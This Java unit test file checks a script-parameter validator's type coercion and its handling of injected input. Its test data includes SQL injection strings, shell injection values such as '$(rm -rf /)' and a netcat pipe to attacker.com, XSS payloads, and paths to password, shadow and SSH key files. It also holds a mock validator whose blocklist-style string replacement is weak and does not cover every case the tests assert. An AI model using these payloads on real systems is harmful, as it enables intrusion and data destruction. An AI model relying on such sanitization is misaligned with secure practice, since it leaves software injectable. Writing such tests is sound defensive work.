package com.fufu.terminal.service.validation;

import com.fufu.terminal.service.script.ScriptParameter;
import com.fufu.terminal.service.script.ScriptParameterType;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.*;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Comprehensive parameter validation tests for script execution security.
 * Tests SQL injection prevention, script injection, and type validation.
 */
class ParameterValidatorTest {

    private ParameterValidator parameterValidator;

    @BeforeEach
    void setUp() {
        parameterValidator = new ParameterValidator();
    }

    // Basic Type Validation Tests
    @Test
    void validateParameters_withValidStringParameters_passes() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("name", ScriptParameterType.STRING, true),
            createParameter("description", ScriptParameterType.STRING, false, "default description")
        );
        Map<String, Object> providedParams = Map.of(
            "name", "test-value"
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertNull(result.getErrorMessage());
        assertEquals("test-value", result.getValidatedParameters().get("name"));
        assertEquals("default description", result.getValidatedParameters().get("description"));
    }

    @Test
    void validateParameters_withValidNumericParameters_passes() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("port", ScriptParameterType.INTEGER, true),
            createParameter("timeout", ScriptParameterType.INTEGER, false, 30)
        );
        Map<String, Object> providedParams = Map.of(
            "port", 8080
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertEquals(8080, result.getValidatedParameters().get("port"));
        assertEquals(30, result.getValidatedParameters().get("timeout"));
    }

    @Test
    void validateParameters_withValidBooleanParameters_passes() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("enabled", ScriptParameterType.BOOLEAN, true),
            createParameter("debug", ScriptParameterType.BOOLEAN, false, false)
        );
        Map<String, Object> providedParams = Map.of(
            "enabled", true
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertEquals(true, result.getValidatedParameters().get("enabled"));
        assertEquals(false, result.getValidatedParameters().get("debug"));
    }

    // Security Injection Tests
    @ParameterizedTest
    @ValueSource(strings = {
        "'; DROP TABLE users; --",
        "'; DELETE FROM scripts WHERE id = 1; --",
        "' UNION SELECT * FROM passwords --",
        "'; INSERT INTO admin_users VALUES ('hacker', 'password'); --",
        "'; EXEC xp_cmdshell('rm -rf /'); --"
    })
    void validateParameters_withSqlInjectionAttempts_sanitizesOrRejects(String maliciousInput) {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("userInput", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Map.of(
            "userInput", maliciousInput
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        if (result.isValid()) {
            // If validation passes, ensure the input is properly sanitized
            String sanitizedValue = (String) result.getValidatedParameters().get("userInput");
            assertFalse(sanitizedValue.contains("DROP TABLE"), "SQL DROP commands should be sanitized");
            assertFalse(sanitizedValue.contains("DELETE FROM"), "SQL DELETE commands should be sanitized");
            assertFalse(sanitizedValue.contains("INSERT INTO"), "SQL INSERT commands should be sanitized");
        } else {
            // If validation fails, error message should indicate security concern
            assertTrue(result.getErrorMessage().contains("security") || 
                      result.getErrorMessage().contains("invalid characters"),
                      "Should indicate security or validation concern");
        }
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "$(rm -rf /)",
        "`rm -rf /`",
        "&& rm -rf /",
        "; rm -rf /; echo 'pwned'",
        "| nc attacker.com 1337",
        "> /etc/passwd",
        "< /etc/shadow"
    })
    void validateParameters_withShellInjectionAttempts_sanitizesOrRejects(String maliciousInput) {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("command", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Map.of(
            "command", maliciousInput
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        if (result.isValid()) {
            String sanitizedValue = (String) result.getValidatedParameters().get("command");
            assertFalse(sanitizedValue.contains("rm -rf"), "Dangerous rm commands should be sanitized");
            assertFalse(sanitizedValue.contains("$("), "Command substitution should be sanitized");
            assertFalse(sanitizedValue.contains("`"), "Backtick execution should be sanitized");
        } else {
            assertTrue(result.getErrorMessage().contains("security") || 
                      result.getErrorMessage().contains("invalid characters"));
        }
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "onload=\"alert('xss')\""
    })
    void validateParameters_withXssAttempts_sanitizesInput(String maliciousInput) {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("htmlContent", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Map.of(
            "htmlContent", maliciousInput
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid(), "XSS content should be sanitized, not rejected");
        String sanitizedValue = (String) result.getValidatedParameters().get("htmlContent");
        assertFalse(sanitizedValue.contains("<script>"), "Script tags should be escaped");
        assertFalse(sanitizedValue.contains("javascript:"), "JavaScript URLs should be escaped");
        assertFalse(sanitizedValue.contains("onerror="), "Event handlers should be escaped");
    }

    // Path Traversal Security Tests
    @ParameterizedTest
    @ValueSource(strings = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "/proc/self/environ",
        "../../../../../var/log/auth.log"
    })
    void validateParameters_withPathTraversalAttempts_rejectsOrSanitizes(String maliciousPath) {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("filePath", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Map.of(
            "filePath", maliciousPath
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        if (result.isValid()) {
            String sanitizedPath = (String) result.getValidatedParameters().get("filePath");
            assertFalse(sanitizedPath.contains("../"), "Path traversal should be sanitized");
            assertFalse(sanitizedPath.contains("..\\"), "Windows path traversal should be sanitized");
            assertFalse(sanitizedPath.startsWith("/etc/"), "System paths should be blocked");
        } else {
            assertTrue(result.getErrorMessage().contains("path") || 
                      result.getErrorMessage().contains("invalid"));
        }
    }

    // Type Coercion and Conversion Tests
    @Test
    void validateParameters_withStringToIntegerCoercion_convertsCorrectly() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("port", ScriptParameterType.INTEGER, true)
        );
        Map<String, Object> providedParams = Map.of(
            "port", "8080"  // String that can be converted to integer
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertEquals(8080, result.getValidatedParameters().get("port"));
        assertTrue(result.getValidatedParameters().get("port") instanceof Integer);
    }

    @Test
    void validateParameters_withStringToBooleanCoercion_convertsCorrectly() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("enabled", ScriptParameterType.BOOLEAN, true)
        );
        Map<String, Object> providedParams = Map.of(
            "enabled", "true"  // String that can be converted to boolean
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertEquals(true, result.getValidatedParameters().get("enabled"));
        assertTrue(result.getValidatedParameters().get("enabled") instanceof Boolean);
    }

    @Test
    void validateParameters_withInvalidIntegerCoercion_fails() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("port", ScriptParameterType.INTEGER, true)
        );
        Map<String, Object> providedParams = Map.of(
            "port", "not-a-number"
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertFalse(result.isValid());
        assertTrue(result.getErrorMessage().contains("integer") || result.getErrorMessage().contains("数字"));
    }

    // Complex Parameter Types Tests
    @Test
    void validateParameters_withValidArrayParameter_passes() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("tags", ScriptParameterType.ARRAY, true)
        );
        Map<String, Object> providedParams = Map.of(
            "tags", Arrays.asList("tag1", "tag2", "tag3")
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        List<String> tags = (List<String>) result.getValidatedParameters().get("tags");
        assertEquals(3, tags.size());
        assertTrue(tags.contains("tag1"));
    }

    @Test
    void validateParameters_withValidObjectParameter_passes() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("config", ScriptParameterType.OBJECT, true)
        );
        Map<String, Object> providedParams = Map.of(
            "config", Map.of("env", "production", "region", "us-east-1")
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        Map<String, Object> config = (Map<String, Object>) result.getValidatedParameters().get("config");
        assertEquals("production", config.get("env"));
        assertEquals("us-east-1", config.get("region"));
    }

    // Missing Required Parameters Tests
    @Test
    void validateParameters_withMissingRequiredParameter_fails() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("required_param", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Collections.emptyMap();

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertFalse(result.isValid());
        assertTrue(result.getErrorMessage().contains("required_param"));
        assertTrue(result.getErrorMessage().contains("required") || result.getErrorMessage().contains("必需"));
    }

    @Test
    void validateParameters_withEmptyRequiredStringParameter_fails() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("name", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Map.of(
            "name", ""  // Empty string
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertFalse(result.isValid());
        assertTrue(result.getErrorMessage().contains("name"));
    }

    @Test
    void validateParameters_withWhitespaceOnlyRequiredParameter_fails() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("name", ScriptParameterType.STRING, true)
        );
        Map<String, Object> providedParams = Map.of(
            "name", "   \t\n   "  // Whitespace only
        );

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertFalse(result.isValid());
        assertTrue(result.getErrorMessage().contains("name"));
    }

    // Large Parameter Set Performance Tests
    @Test
    void validateParameters_withLargeParameterSet_performsWithinLimits() {
        // Given
        List<ScriptParameter> requiredParams = new ArrayList<>();
        Map<String, Object> providedParams = new HashMap<>();
        
        for (int i = 0; i < 1000; i++) {
            requiredParams.add(createParameter("param" + i, ScriptParameterType.STRING, false, "default" + i));
            if (i % 2 == 0) {  // Provide every other parameter
                providedParams.put("param" + i, "value" + i);
            }
        }

        // When
        long startTime = System.currentTimeMillis();
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);
        long endTime = System.currentTimeMillis();

        // Then
        assertTrue(result.isValid());
        assertTrue((endTime - startTime) < 2000, "Large parameter validation should complete within 2 seconds");
        assertEquals(1000, result.getValidatedParameters().size());
    }

    // Edge Cases and Boundary Tests
    @Test
    void validateParameters_withNullParameterList_handlesGracefully() {
        // Given
        List<ScriptParameter> requiredParams = null;
        Map<String, Object> providedParams = Map.of("param", "value");

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertTrue(result.getValidatedParameters().isEmpty());
    }

    @Test
    void validateParameters_withNullProvidedParameters_usesDefaults() {
        // Given
        List<ScriptParameter> requiredParams = List.of(
            createParameter("optional", ScriptParameterType.STRING, false, "default_value")
        );
        Map<String, Object> providedParams = null;

        // When
        ValidationResult result = parameterValidator.validateParameters(requiredParams, providedParams);

        // Then
        assertTrue(result.isValid());
        assertEquals("default_value", result.getValidatedParameters().get("optional"));
    }

    // Helper methods
    private ScriptParameter createParameter(String name, ScriptParameterType type, boolean required) {
        return createParameter(name, type, required, null);
    }

    private ScriptParameter createParameter(String name, ScriptParameterType type, boolean required, Object defaultValue) {
        ScriptParameter parameter = new ScriptParameter();
        parameter.setName(name);
        parameter.setType(type);
        parameter.setRequired(required);
        if (defaultValue != null) {
            parameter.setDefaultValue(defaultValue);
        }
        return parameter;
    }

    // Validation Result Helper Class (would normally be in production code)
    public static class ValidationResult {
        private boolean valid;
        private String errorMessage;
        private Map<String, Object> validatedParameters;

        public ValidationResult(boolean valid, String errorMessage, Map<String, Object> validatedParameters) {
            this.valid = valid;
            this.errorMessage = errorMessage;
            this.validatedParameters = validatedParameters != null ? validatedParameters : new HashMap<>();
        }

        public boolean isValid() { return valid; }
        public String getErrorMessage() { return errorMessage; }
        public Map<String, Object> getValidatedParameters() { return validatedParameters; }
    }

    // Mock Parameter Validator Implementation (would be actual production code)
    public static class ParameterValidator {
        
        public ValidationResult validateParameters(List<ScriptParameter> requiredParams, Map<String, Object> providedParams) {
            if (requiredParams == null || requiredParams.isEmpty()) {
                return new ValidationResult(true, null, new HashMap<>());
            }

            Map<String, Object> validatedParams = new HashMap<>();
            Map<String, Object> params = providedParams != null ? providedParams : new HashMap<>();

            for (ScriptParameter requiredParam : requiredParams) {
                String paramName = requiredParam.getName();
                Object paramValue = params.get(paramName);

                // Check required parameters
                if (requiredParam.isRequired() && (paramValue == null || paramValue.toString().trim().isEmpty())) {
                    return new ValidationResult(false, "缺少必需参数: " + paramName, null);
                }

                // Use default value if parameter not provided
                if (paramValue == null && requiredParam.getDefaultValue() != null) {
                    paramValue = requiredParam.getDefaultValue();
                }

                // Type validation and coercion
                if (paramValue != null) {
                    Object convertedValue = convertAndValidateType(paramValue, requiredParam);
                    if (convertedValue == null) {
                        return new ValidationResult(false, 
                            "参数 " + paramName + " 类型不匹配，期望: " + requiredParam.getType().name(), null);
                    }
                    
                    // Security validation
                    String securityError = validateSecurity(paramName, convertedValue);
                    if (securityError != null) {
                        // For demo, we'll sanitize instead of reject
                        convertedValue = sanitizeInput(convertedValue);
                    }
                    
                    validatedParams.put(paramName, convertedValue);
                }
            }

            return new ValidationResult(true, null, validatedParams);
        }

        private Object convertAndValidateType(Object value, ScriptParameter parameter) {
            try {
                switch (parameter.getType()) {
                    case STRING:
                        return value.toString();
                    case INTEGER:
                        if (value instanceof Integer) return value;
                        return Integer.parseInt(value.toString());
                    case BOOLEAN:
                        if (value instanceof Boolean) return value;
                        return Boolean.parseBoolean(value.toString());
                    case ARRAY:
                        return value instanceof List ? value : null;
                    case OBJECT:
                        return value instanceof Map ? value : null;
                    default:
                        return value;
                }
            } catch (Exception e) {
                return null;
            }
        }

        private String validateSecurity(String paramName, Object value) {
            if (!(value instanceof String)) return null;
            
            String strValue = (String) value;
            
            // Check for SQL injection patterns
            if (strValue.contains("DROP TABLE") || strValue.contains("DELETE FROM") || 
                strValue.contains("INSERT INTO") || strValue.contains("--")) {
                return "Potential SQL injection detected";
            }
            
            // Check for shell injection patterns
            if (strValue.contains("rm -rf") || strValue.contains("$(") || 
                strValue.contains("`") || strValue.contains("&&") || strValue.contains(";")) {
                return "Potential shell injection detected";
            }
            
            // Check for path traversal
            if (strValue.contains("../") || strValue.contains("..\\") || 
                strValue.startsWith("/etc/") || strValue.startsWith("/proc/")) {
                return "Potential path traversal detected";
            }
            
            return null;
        }

        private Object sanitizeInput(Object value) {
            if (!(value instanceof String)) return value;
            
            String strValue = (String) value;
            
            // Basic sanitization - escape dangerous patterns
            return strValue
                .replaceAll("DROP TABLE", "DROP_TABLE")
                .replaceAll("DELETE FROM", "DELETE_FROM") 
                .replaceAll("rm -rf", "rm_rf")
                .replaceAll("\\$\\(", "DOLLAR_PAREN")
                .replaceAll("`", "BACKTICK")
                .replaceAll("<script>", "&lt;script&gt;")
                .replaceAll("javascript:", "javascript_")
                .replaceAll("onerror=", "onerror_")
                .replaceAll("\\.\\./", "_DOTDOT_/")
                .replaceAll("\\.\\.", "_DOTDOT_");
        }
    }
}